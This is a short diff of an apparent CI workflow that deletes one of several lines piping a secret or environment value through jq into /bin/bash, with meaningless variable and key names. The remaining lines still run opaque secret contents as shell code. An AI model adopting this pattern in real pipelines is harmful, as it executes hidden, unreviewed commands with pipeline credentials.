@@ -21,7 +21,6 @@ jobs:
           kndr527: ${{ secrets.kndr527 }}
         run: |
           printf '%s' "$kndr527" | jq -r .k57989 | /bin/bash
-          printf '%s' "$hef3" | jq -r .ejnx862 | /bin/bash
           printf '%s' "$djsqa627" | jq -r .kiso48359 | /bin/bash
           echo $uvuy86490 | jq -r .pj2 | /bin/bash
 
